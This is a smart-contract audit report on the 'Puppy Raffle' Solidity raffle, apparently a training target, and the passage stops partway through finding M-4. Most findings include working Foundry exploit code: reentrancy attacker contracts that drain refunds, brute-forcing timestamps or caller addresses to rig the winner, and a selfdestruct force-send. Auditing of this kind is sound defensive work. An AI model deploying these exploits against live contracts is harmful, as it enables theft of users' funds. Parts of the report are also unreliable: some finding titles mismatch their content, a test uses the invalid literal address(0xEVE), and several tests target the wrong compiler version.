# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### 🐶 Puppy Raffle (ERC-721 Raffle NFT)

Puppy Raffle is an on-chain game where anyone can buy raffle entries and compete for a randomly minted dog NFT plus 80 % of the ETH pot.

**Flow**
1. **Start:** Each round begins automatically when the previous one ends; `raffleStartTime` timestamps it.
2. **Enter:** `enterRaffle(address[] players)` is called with `entranceFee × n`. Duplicate addresses are rejected. All entrants are stored in an array.
3. **Refund:** Before a winner is drawn, any player can `refund(index)` to reclaim their stake; the slot is zeroed but indices are preserved.
4. **Winner selection:** After `raffleDuration` and if ≥ 4 active players, anyone can call `selectWinner()`. A pseudo-random index chooses the winner, and another roll assigns NFT rarity (70 % common, 25 % rare, 5 % legendary).
5. **Payouts:** Winner receives 80 % of the pot and an ERC-721 Puppy NFT with on-chain metadata & IPFS image. The remaining 20 % is added to `totalFees`.
6. **Protocol fees:** Owner can `withdrawFees()` to send accrued fees to `feeAddress`, and may update that address via `changeFeeAddress()`.

All logic is contained in `src/PuppyRaffle.sol` (solc 0.7.6) and is fully testable with Foundry.
## High Risk Findings
[H-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[H-2]. Reentrancy issue in PuppyRaffle::refund
[H-3]. Randomness issue in PuppyRaffle::selectWinner
[H-4]. Delegatecall Low Level Ops issue in PuppyRaffle::refund
[H-5]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::selectWinner
## Medium Risk Findings
[M-1]. Integer Overflow issue in PuppyRaffle::selectWinner
[M-2]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner
[M-3]. Unchecked Return issue in PuppyRaffle::withdrawFees
[M-4]. DOS issue in PuppyRaffle::enterRaffle
[M-5]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-6]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[M-7]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
## Low Risk Findings
[L-1]. Gas Grief BlockLimit issue in PuppyRaffle::refund
[L-2]. Integer Overflow/Math issue in PuppyRaffle::withdrawFees
[L-3]. DOS issue in PuppyRaffle::getActivePlayerIndex
[L-4]. DOS issue in PuppyRaffle::selectWinner
[L-5]. Gas Grief BlockLimit issue in PuppyRaffle::getActivePlayerIndex
## Info Risk Findings
[I-1]. Integer Overflow/Math issue in PuppyRaffle::getActivePlayerIndex
[I-2]. Pragma issue in PuppyRaffle::NA
[I-3]. Reentrancy issue in PuppyRaffle::selectWinner
[I-4]. Event Consistency issue in PuppyRaffle::selectWinner


### Number of Findings
- H: 5
- M: 7
- L: 5
- I: 4



# High Risk Findings

## [H-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function performs a quadratic time complexity operation (O(n²)) when checking for duplicate players. For each new player, it compares against all existing players. This can cause the transaction to run out of gas as the number of players increases, leading to a denial of service.

```solidity
function enterRaffle(address[] calldata newPlayers) external payable {
    // ...
    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    // ...
}
```

## Impact
Any two entrants can permanently brick the raffle. After both of them call `refund()`, the players array contains two identical `address(0)` slots. The next call to `enterRaffle()` iterates over the whole array and reverts on the first duplicate it meets ("PuppyRaffle: Duplicate player"). No new players can ever join, `selectWinner()` requires at least 4 players so it will never succeed, and the protocol fees can never be withdrawn. The contract is therefore rendered unusable and all future revenue is lost.

## Proof of Concept
1. Alice and Bob each buy one ticket.
2. Both call `refund()`, so `players` becomes `[address(0), address(0)]`.
3. Charlie tries to enter with a fresh address.  Inside `enterRaffle()` the nested loops compare the two zero addresses, hit the `require(players[i] != players[j])` check and revert with "PuppyRaffle: Duplicate player".  From this point on no one can enter again and the raffle is stuck forever.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract DuplicateZeroDoSTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;

    address alice = vm.addr(1);
    address bob   = vm.addr(2);
    address charlie = vm.addr(3);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(this), 1 days);
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
        vm.deal(charlie, 10 ether);

        address[] memory firstTwo = new address[](2);
        firstTwo[0] = alice;
        firstTwo[1] = bob;
        vm.prank(alice);
        raffle.enterRaffle{value: FEE * 2}(firstTwo);

        // Alice and Bob both refund
        vm.prank(alice);
        raffle.refund(0);
        vm.prank(bob);
        raffle.refund(1);
    }

    function testDuplicateZeroReverts() public {
        address[] memory one = new address[](1);
        one[0] = charlie;

        vm.prank(charlie);
        vm.expectRevert(bytes("PuppyRaffle: Duplicate player"));
        raffle.enterRaffle{value: FEE}(one);
    }
}

## Suggested Mitigation
Keep a mapping `mapping(address => bool) public entered;` and simply iterate over `newPlayers` once:

for (uint i; i < newPlayers.length; ++i) {
    address p = newPlayers[i];
    require(!entered[p], "duplicate");
    entered[p] = true;
    players.push(p);
}

When a player is refunded or when a round ends, reset `entered[player] = false;`.  Because the mapping gives O(1) look-ups, the duplicate check is constant-time and does not fail on multiple `address(0)` slots, fully removing the DoS condition.

## [H-2]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function uses `sendValue` to send ETH to users without checking for reentrancy. This allows an attacker to reenter the contract via a fallback function and call `refund` multiple times, potentially draining the contract of funds.

```solidity
function refund(uint256 playerIndex) external {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // This call could enable reentrancy
    address(msg.sender).sendValue(entranceFee);
    
    // State is updated after external call
    players[playerIndex] = address(0);
    
    emit RaffleRefunded(playerAddress);
}
```

## Impact
An attacker can drain multiple entrance fees from the contract by calling `refund` within their fallback function, stealing funds from the contract and potentially from other players. This could lead to a complete draining of the contract's ETH balance, breaking the protocol's functionality and causing financial loss to users.

## Proof of Concept
1. Attacker enters the raffle with their address
2. Attacker creates a malicious contract with a fallback function that calls `refund` again
3. Attacker calls `refund` from their malicious contract
4. When `sendValue` is called, the malicious contract's fallback function executes
5. The fallback function calls `refund` again with the same index
6. Since `players[playerIndex]` hasn't been updated yet, the check passes
7. Attacker receives another refund
8. This continues until transaction runs out of gas or contract funds are drained

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle public raffle;
    uint256 public idx;
    uint256 public fee;

    constructor(PuppyRaffle _raffle, uint256 _fee) payable {
        raffle = _raffle;
        fee = _fee;
    }

    function attack() external payable {
        // 1. enter once so we are added to players[]
        address[] memory a = new address[](1);
        a[0] = address(this);
        raffle.enterRaffle{value: fee}(a);

        // 2. cache our index for later re-entry
        idx = raffle.getActivePlayerIndex(address(this));

        // 3. start the first refund (re-entrancy keeps firing from receive())
        raffle.refund(idx);
    }

    // re-enter until contract no longer has enough balance to pay another ticket
    receive() external payable {
        if (address(raffle).balance >= fee) {
            raffle.refund(idx);
        }
    }
}

contract ReentrancyFixedTest is Test {
    PuppyRaffle raffle;
    ReentrancyAttacker attacker;
    uint256 constant FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(10), 1 days);

        // add three honest players so contract holds extra ETH
        for (uint256 i = 1; i <= 3; i++) {
            address p = address(uint160(i + 100));
            vm.deal(p, FEE);
            address[] memory arr = new address[](1);
            arr[0] = p;
            vm.prank(p);
            raffle.enterRaffle{value: FEE}(arr);
        }

        // deploy attacker contract with 1 ether funded
        attacker = new ReentrancyAttacker{value: FEE}(raffle, FEE);
        vm.deal(address(attacker), FEE);
    }

    function test_reentrancyRefund() public {
        uint256 balBefore = address(attacker).balance;
        attacker.attack{value: FEE}();
        uint256 balAfter = address(attacker).balance;

        assertGt(balAfter, balBefore + FEE, "attacker should profit by re-entrancy");
        assertLt(address(raffle).balance, 3 * FEE, "contract drained of more than attacker’s own stake");
    }
}

## Suggested Mitigation
Apply the checks-effects-interactions pattern by updating the state before making external calls. Also add a reentrancy guard for extra protection:

```solidity
// Add reentrancy guard
bool private locked;

modifier nonReentrant() {
    require(!locked, "No reentrancy");
    locked = true;
    _;
    locked = false;
}

function refund(uint256 playerIndex) external nonReentrant {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Update state before external call
    players[playerIndex] = address(0);
    
    // Make external call after state update
    address(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}
```

## [H-3]. Randomness issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses predictable values for randomness, making the selection process vulnerable to manipulation. The function uses `msg.sender`, `block.timestamp`, and `block.difficulty` which can all be predicted or manipulated by miners.

```solidity
// For winner selection
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;

// For NFT rarity
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
```

## Impact
Because the winner index is computed from keccak256(msg.sender, block.timestamp, block.difficulty) % players.length, the user that calls selectWinner can locally compute the exact timestamp values (within the miner-permitted range) for which the hash resolves to the index they control. The caller simply waits until the raffle duration has elapsed, searches for a favourable timestamp, then sends selectWinner and bribes the block producer (or produces the block themselves) to use that timestamp. This lets the attacker deterministically win the whole prize pool as long as they are one of the players, breaking the economic fairness of the raffle.

## Proof of Concept
1. Assume the attacker is already an entrant at index 0 in the `players` array.
2. Once `raffleDuration` has elapsed, the attacker locally iterates over the 30-second window `[now, now+15]` and `[now-15, now]` that miners are allowed to set for `block.timestamp`.
3. For each candidate `ts`, compute `winnerIndex = uint256(keccak256(abi.encodePacked(attackerAddress, ts, currentDifficulty))) % players.length`.
4. As soon as a `ts` that yields `winnerIndex == 0` is found, the attacker submits `selectWinner()` with a bribe so that the block producer uses that exact timestamp.
5. The contract deterministically selects the attacker as the winner and transfers 80 % of the pot to them.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PredictableWinnerTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;
    address attacker = address(11);
    address[4] otherPlayers;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(99), 1 days);

        // fund and enter attacker (index 0)
        vm.deal(attacker, FEE);
        vm.prank(attacker);
        address[] memory single = new address[](1);
        single[0] = attacker;
        raffle.enterRaffle{value: FEE}(single);

        // add three more distinct players so total >= 4
        for (uint256 i = 0; i < 3; i++) {
            otherPlayers[i] = address(uint160(i + 20));
            vm.deal(otherPlayers[i], FEE);
            vm.prank(otherPlayers[i]);
            single[0] = otherPlayers[i];
            raffle.enterRaffle{value: FEE}(single);
        }

        // Raffle duration is over
        vm.warp(block.timestamp + 1 days + 1);
    }

    function testAttackerCanPredictAndWin() public {
        uint256 len = 4; // players.length
        uint256 diff = block.difficulty; // constant on testnet
        uint256 wantedTs;
        bool found;

        // Search the next 30 seconds (miner tolerance window)
        for (uint256 ts = block.timestamp; ts < block.timestamp + 30; ts++) {
            uint256 idx = uint256(keccak256(abi.encodePacked(attacker, ts, diff))) % len;
            if (idx == 0) {
                wantedTs = ts;
                found = true;
                break;
            }
        }
        require(found, "should find ts in 30s window for demo");

        // Simulate miner using that timestamp
        vm.warp(wantedTs);

        // Attacker calls selectWinner and must win
        vm.prank(attacker);
        raffle.selectWinner();
        assertEq(raffle.previousWinner(), attacker);
    }
}

## Suggested Mitigation
Replace the current pseudo-randomness with an unbiasable source such as Chainlink VRF, a RANDAO post-commit-reveal scheme, or another publicly verifiable randomness beacon. The random value must be delivered asynchronously, so the contract should store a pending raffle round and finalise it only after the VRF callback supplies the random seed.

## [H-4]. Delegatecall Low Level Ops issue in PuppyRaffle::refund

## Description
The `refund` function uses `address(msg.sender).sendValue(entranceFee)` to send ETH, which is unnecessarily complex and may cause issues. The contract could use `payable(msg.sender).transfer(entranceFee)` instead.

```solidity
function refund(uint256 playerIndex) external {
    // ...
    address(msg.sender).sendValue(entranceFee);
    // ...
}
```

## Impact
A malicious participant can exploit re-entrancy in refund() to call it multiple times before players[playerIndex] is set to zero, receiving entranceFee again and again. As long as the contract still holds ETH (e.g. from other honest players) the attacker drains it, leading to a complete loss of funds for the raffle and the protocol.

## Proof of Concept
1. Attacker joins the raffle once, paying entranceFee.
2. Honest users join afterwards so the contract holds additional ETH.
3. Attacker calls refund(). As soon as the contract executes Address.sendValue(), the attacker’s receive() hook is triggered.
4. Inside receive(), the attacker calls refund() again (state has NOT been updated yet), which succeeds and transfers another entranceFee.
5. Steps 3-4 repeat until the contract no longer has entranceFee wei left, emptying its balance.

The vulnerability exists because the contract breaks the checks-effects-interactions pattern: external call (sendValue) is executed before the effect (clearing the players array).

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ReentrantAttacker {
    PuppyRaffle public raffle;
    uint256 public idx;
    uint256 public fee;
    bool private attacking;

    constructor(PuppyRaffle _raffle, uint256 _fee) payable {
        raffle = _raffle;
        fee = _fee;
    }

    function enter() external payable {
        address[] memory arr = new address[](1);
        arr[0] = address(this);
        raffle.enterRaffle{value: fee}(arr);
        idx = raffle.getActivePlayerIndex(address(this));
    }

    function startAttack() external {
        attacking = true;
        raffle.refund(idx);
        attacking = false;
    }

    receive() external payable {
        if (attacking && address(raffle).balance >= fee) {
            raffle.refund(idx);
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle raffle;
    ReentrantAttacker attacker;
    uint256 constant ENTRANCE_FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(123), 1 days);

        attacker = new ReentrantAttacker{value: ENTRANCE_FEE}(raffle, ENTRANCE_FEE);
        vm.prank(address(attacker));
        attacker.enter{value: ENTRANCE_FEE}();

        // fund raffle with 3 more players so there is something to steal
        address[] memory others = new address[](3);
        others[0] = address(100);
        others[1] = address(101);
        others[2] = address(102);
        raffle.enterRaffle{value: ENTRANCE_FEE * 3}(others);
    }

    function testDrainViaReentrancy() public {
        uint256 beforeBal = address(attacker).balance;
        vm.prank(address(attacker));
        attacker.startAttack();
        uint256 afterBal = address(attacker).balance;
        assertGt(afterBal, beforeBal + ENTRANCE_FEE, "attacker gained additional ETH via reentrancy");
    }
}

## Suggested Mitigation
Follow the checks-effects-interactions pattern: move `players[playerIndex] = address(0);` before the external call, or protect the function with OpenZeppelin’s `ReentrancyGuard` modifier. `sendValue` can still be used safely once state is updated.

## [H-5]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::selectWinner

## Description
The `selectWinner()` function is unprotected and can be called by anyone, allowing frontrunning attacks. Since the winner selection depends partially on the caller's address (`msg.sender`), this means that anyone who observes a pending selectWinner transaction can calculate the outcome and potentially frontrun it with their own call if they don't like the result.

```solidity
function selectWinner() external {
    // ... validation ...
    
    // Winner selection depends on msg.sender
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    // ... more code ...
}
```

## Impact
This allows participants or external observers to manipulate who wins the raffle and what rarity of NFT is minted. Malicious actors could monitor pending transactions, calculate the outcomes, and decide whether to frontrun the transaction with their own if it produces a more favorable result for them. This completely undermines the fairness of the raffle system.

## Proof of Concept
1. Alice calls selectWinner() and this transaction enters the mempool
2. Bob, who monitors the mempool, sees Alice's transaction
3. Bob calculates what the winner would be with Alice's transaction (using her address as msg.sender)
4. Bob also calculates what the winner would be if he called selectWinner() (using his address)
5. If Bob's calculation shows a more favorable outcome (e.g., he or his friends win), he frontrunsAlice's transaction with a higher gas price
6. Bob's transaction is processed first, potentially stealing the winning position

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/StdCheats.sol";
import "../src/PuppyRaffle.sol";

contract BiasableRaffleTest is Test {
    PuppyRaffle raffle;

    address deployer = address(0xA11CE);
    address payable alice = payable(address(0xB0B));      // victim player
    address payable eve   = payable(address(0xEVE));      // attacker-owned player that already joined raffle

    uint256 entranceFee = 1 ether;

    function setUp() public {
        vm.deal(deployer, 10 ether);
        vm.prank(deployer);
        raffle = new PuppyRaffle(entranceFee, deployer, 1 days);

        // create player array [eve, alice, 2 more victims]
        address[] memory players = new address[](4);
        players[0] = eve;                      // attacker-controlled entrant
        players[1] = alice;                    // honest entrant
        players[2] = address(0xCAFE);
        players[3] = address(0xD00D);

        // fund eve with enough for all 4 tickets and enter raffle once on behalf of all
        vm.deal(eve, entranceFee * 4);
        vm.prank(eve);
        raffle.enterRaffle{value: entranceFee * 4}(players);

        // fast-forward so raffle can be closed
        vm.warp(block.timestamp + 1 days + 1);
    }

    function testAttackerCanBiasWinner() public {
        // attacker searches for an EOA address that makes index 0 (eve) win
        uint256 targetIdx = 0; // we want eve (players[0]) to win
        address operator;

        // brute-force a vanity address (in < 256 iterations on average because 4 players)   
        for (uint256 salt = 1; salt < 5000; salt++) {
            address candidate = address(uint160(uint256(keccak256(abi.encodePacked(salt)))));
            uint256 idx = uint256(keccak256(abi.encodePacked(candidate, block.timestamp, block.difficulty))) % 4;
            if (idx == targetIdx) {
                operator = candidate;
                break;
            }
        }
        require(operator != address(0), "no operator found (test invariant broken)");

        vm.deal(operator, 1 ether);           // give operator some gas
        vm.prank(operator);
        raffle.selectWinner();                // attacker closes raffle with chosen operator address

        // Eve must have received the NFT (balance > 0 proves she was winner)
        assertEq(raffle.balanceOf(eve), 1, "attacker biased raffle so her own address wins");
    }
}

## Suggested Mitigation
There are several ways to mitigate this issue:

1. Use a commit-reveal scheme or a trusted source of randomness like Chainlink VRF instead of depending on msg.sender.

2. Restrict the selectWinner function to a trusted role (e.g., owner or a dedicated address):

```solidity
address public raffleOperator;

constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) {
    // ... existing code ...
    raffleOperator = msg.sender;
}

function selectWinner() external {
    require(msg.sender == raffleOperator, "PuppyRaffle: Only operator can select winner");
    // ... rest of function ...
}

function setRaffleOperator(address newOperator) external onlyOwner {
    raffleOperator = newOperator;
}
```

3. Remove the dependence on msg.sender for randomness generation:

```solidity
function selectWinner() external {
    // ... validation ...
    
    // Use only block properties, not msg.sender
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, blockhash(block.number - 1)))) % players.length;
    // ... rest of function ...
}
```

The most secure option would be to implement a proper random number generation solution like Chainlink VRF.



# Medium Risk Findings

## [M-1]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
The contract's `totalFees` variable is stored as a uint64, which limits the maximum amount of fees that can be accumulated to 2^64-1 (18.45 ETH at 1e18 wei per ETH). This creates a potential overflow risk if the protocol becomes successful and accumulates fees beyond this limit.

```solidity
uint64 public totalFees = 0;

function selectWinner() external {
    // ...
    fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee); // Potential overflow here
    // ...
}
```

## Impact
After the first overflow of totalFees, the value stored is smaller than the real amount of ETH held by the contract. The invariant checked in withdrawFees() (`address(this).balance == totalFees`) will never hold again, causing every future withdrawal attempt to revert. Consequently, not only are the excess fees lost due to wrapping, but the entire fee pool that is already in the contract becomes permanently inaccessible, effectively bricking the fee-collection mechanism.

## Proof of Concept
1. Deploy PuppyRaffle with a high entrance fee (e.g., 1 ETH)
2. Run many successful raffles with many participants
3. Allow fees to accumulate without withdrawing
4. Once total fees approach 18.45 ETH, the next raffle will cause `totalFees` to overflow
5. Some fees will be lost due to the overflow

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract FeesOverflowTest is Test {
    PuppyRaffle puppyRaffle;
    address public user1 = makeAddr("user1");
    uint256 entranceFee = 1e18; // 1 ETH

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        vm.deal(user1, 10000e18); // Give user plenty of ETH
    }

    function testTotalFeesOverflow() public {
        // To demonstrate the overflow, we'll manually set totalFees close to max uint64
        uint64 nearMaxUint64 = type(uint64).max - 1e18; // 1 ETH below max
        vm.store(
            address(puppyRaffle),
            bytes32(uint256(5)), // totalFees is the 6th storage slot (index 5)
            bytes32(uint256(nearMaxUint64))
        );
        
        // Verify we set it correctly
        assertEq(puppyRaffle.totalFees(), nearMaxUint64);
        
        // Now run a raffle that will generate more than 1 ETH in fees
        address[] memory players = new address[](20);
        for (uint256 i = 0; i < 20; i++) {
            players[i] = address(uint160(i + 1));
        }
        
        vm.prank(user1);
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        
        // Skip ahead to end of raffle
        vm.warp(block.timestamp + 1 days + 1);
        
        // This should generate more than 1 ETH in fees (20 ETH * 20% = 4 ETH)
        puppyRaffle.selectWinner();
        
        // Check totalFees - it should have overflowed
        uint64 newTotalFees = puppyRaffle.totalFees();
        console.log("Previous totalFees:", nearMaxUint64);
        console.log("New totalFees after overflow:", newTotalFees);
        
        // Demonstrate that we've lost fees due to overflow
        assertTrue(newTotalFees < nearMaxUint64, "Fees should have overflowed and wrapped around");
    }
}

## Suggested Mitigation
Use a larger integer type for the `totalFees` variable to prevent overflow. Using `uint256` would be the safest choice:

```solidity
uint256 public totalFees = 0; // Changed from uint64 to uint256

function selectWinner() external {
    // ...
    fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + fee; // No need for casting, preventing overflow
    // ...
}
```

Alternatively, if there are gas optimization concerns, consider using a uint128 which would still allow for a maximum of ~340 trillion ETH in fees.

## [M-2]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses block attributes (timestamp, difficulty) for randomness, which are manipulable by miners/validators. This allows them to influence the selection of winners and the rarity of NFTs to their advantage.

```solidity
function selectWinner() external {
    // ...
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    // ...
    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
    // ...
}
```

## Impact
Because the winner and rarity are derived from block.timestamp and block.difficulty – two miner-controlled values – plus msg.sender, the outcome of the raffle is manipulable. A block producer (or a user collaborating with the producer) can repeatedly simulate the hash off-chain, and only submit the selectWinner() transaction in a block whose timestamp gives them the desired result. By doing so they can (1) divert the 80 % prize pool to themselves and (2) bias the NFT rarity distribution, breaking the core fairness guarantees of the protocol.

## Proof of Concept
Below is a minimal scenario that shows how an attacker controlling block parameters can pick a timestamp that makes them the winner. The attacker scans a small timestamp range off-chain, finds a value that returns their index, and then includes the selectWinner() call in a block with that exact timestamp. On mainnet the attacker would be the block producer; in the test we emulate this using hevm cheat-codes.

1. Four addresses join the raffle (attacker is index 0).
2. We advance the clock to after the raffle duration.
3. The attacker brute-forces the next 15-second window and determines a timestamp that makes them win.
4. We set the forged block timestamp to that value and call selectWinner().
5. Assert that the attacker became previousWinner.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RngManipulationTest is Test {
    PuppyRaffle raffle;
    address attacker = makeAddr("attacker");
    address[3] otherUsers;
    uint256 constant ENTRANCE_FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(this), 1 days);
        vm.deal(attacker, 10 ether);
        for (uint256 i; i < 3; i++) {
            otherUsers[i] = makeAddr(string(abi.encodePacked("user", i)));
            vm.deal(otherUsers[i], 10 ether);
        }

        // anyone can pay for all players – simplifies set-up
        address[] memory players = new address[](4);
        players[0] = attacker;
        players[1] = otherUsers[0];
        players[2] = otherUsers[1];
        players[3] = otherUsers[2];

        vm.prank(attacker);
        raffle.enterRaffle{value: ENTRANCE_FEE * players.length}(players);
    }

    function testAttackerFindsWinningTimestamp() public {
        // move to end of raffle
        vm.warp(block.timestamp + 1 days + 1);

        uint256 targetTs;
        bool found;
        for (uint256 i; i < 20 && !found; i++) {
            uint256 ts = block.timestamp + i;
            uint256 idx = uint256(keccak256(abi.encodePacked(attacker, ts, uint256(block.difficulty)))) % 4;
            if (idx == 0) { // attacker is players[0]
                targetTs = ts;
                found = true;
            }
        }
        require(found, "no winning ts in search window, enlarge window in test");

        // emulate miner: fix block timestamp and call selectWinner as attacker
        vm.warp(targetTs);
        vm.prank(attacker);
        raffle.selectWinner();

        assertEq(raffle.previousWinner(), attacker, "attacker should be the winner");
    }
}

## Suggested Mitigation
Eliminate miner-controlled entropy. Integrate a verifiable randomness oracle such as Chainlink VRF, or at minimum adopt a commit-reveal scheme where (1) participants commit a secret prior to the end of the raffle and (2) reveal it afterwards to generate the random seed. Do not rely on block.timestamp, blockhash, block.difficulty or msg.sender for randomness.

## [M-3]. Unchecked Return issue in PuppyRaffle::withdrawFees

## Description
In the `withdrawFees` function, the contract checks if its balance equals `totalFees` before allowing a withdrawal. However, the contract can receive ETH through other means (like `selfdestruct` targeting the contract or direct ETH transfers to precomputed contract addresses) which would break this check and prevent fee withdrawals.

```solidity
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## Impact
If the contract receives ETH through means other than the raffle process, the balance check will fail, and fee withdrawals will be blocked. This creates a potential denial of service for fee withdrawals, preventing the protocol owners from accessing their earned fees.

## Proof of Concept
1. Four players enter the raffle so that fees are accrued.
2. After the raffle duration passes, anyone calls selectWinner(), leaving only protocol fees inside the contract.
3. An external helper contract self-destructs and forcibly sends 1 wei to PuppyRaffle.
4. Any attempt to call withdrawFees() now reverts with the original require, proving the fees are permanently locked.

This is implemented in the revised Foundry test below.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ForceSend {
    constructor() payable {}
    function boom(address payable target) external {
        selfdestruct(target);
    }
}

contract WithdrawFeesLockedTest is Test {
    PuppyRaffle raffle;
    address feeRecipient = makeAddr("fee");
    address p1 = makeAddr("p1");
    address p2 = makeAddr("p2");
    address p3 = makeAddr("p3");
    address p4 = makeAddr("p4");

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, feeRecipient, 1 days);
        vm.deal(p1, 10 ether);
        vm.deal(p2, 10 ether);
        vm.deal(p3, 10 ether);
        vm.deal(p4, 10 ether);
    }

    function testFeesBecomeUnwithdrawable() public {
        address[] memory players = new address[](4);
        players[0] = p1;
        players[1] = p2;
        players[2] = p3;
        players[3] = p4;

        vm.startPrank(p1);
        raffle.enterRaffle{value: 4 ether}(players);
        vm.stopPrank();

        vm.warp(block.timestamp + 1 days + 1);
        raffle.selectWinner();

        // force-send 1 wei
        ForceSend fs = new ForceSend{value: 1 wei}();
        fs.boom(payable(address(raffle)));

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Maintain a dedicated `activePlayerCount` variable that is incremented for every successful entry and decremented on each refund or after `selectWinner()` clears the players list. Then change the guard to:

require(activePlayerCount == 0, "PuppyRaffle: There are currently players active");

and remove the fragile balance equality check. This ensures the function is not blocked by unsolicited ETH while still protecting player funds.

## [M-4]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function performs a nested loop through the `players` array to check for duplicates. This has O(n²) complexity, where n is the number of players. As the number of players grows, the gas cost increases quadratically, potentially exceeding the block gas limit and making the function unusable. This allows an attacker to grief the protocol by making the `enterRaffle` function unusable when the array becomes too large.

```solidity
// Nested loop with O(n²) complexity
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```

## Impact
Because the duplicate-check is O(n²), gas required to call enterRaffle() grows much faster than the number of registered players. An attacker can pre-fill the raffle with a large list of addresses they control. Once the array is large enough, any further call to enterRaffle(), including by honest users, will need more gas than the block gas limit and will inevitably revert. Although existing players can still call refund(), no new participants can join, effectively freezing the raffle round and stopping protocol revenue.

## Proof of Concept
1. Attacker funds a single EOA with enough ETH to cover the entrance fees.
2. The attacker prepares an array of e.g. 1 200 fresh addresses and calls enterRaffle(), paying entranceFee * 1200. This succeeds because the attacker supplies a large gas limit.
3. The players array now contains 1 200 entries.
4. Any subsequent call to enterRaffle() (even with only one new address) performs ~1 200² ≈ 1.4 M comparisons. The intrinsic gas cost exceeds the 30 M block gas limit, so the transaction always runs Out-Of-Gas and reverts.
5. The raffle is stuck; honest users cannot enter and must wait until the attacker (who controls most of the slots) decides to refund.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract GasGrowthTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE = 1e15; // 0.001 ether – cheap so we can create many entries
    address constant OWNER   = address(1);
    address constant FUNDER  = address(2);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE, OWNER, 1 days);
        vm.deal(FUNDER, 1_000 ether);
    }

    function testQuadraticGasGrowth() public {
        // add 50 players
        address[] memory batch1 = new address[](50);
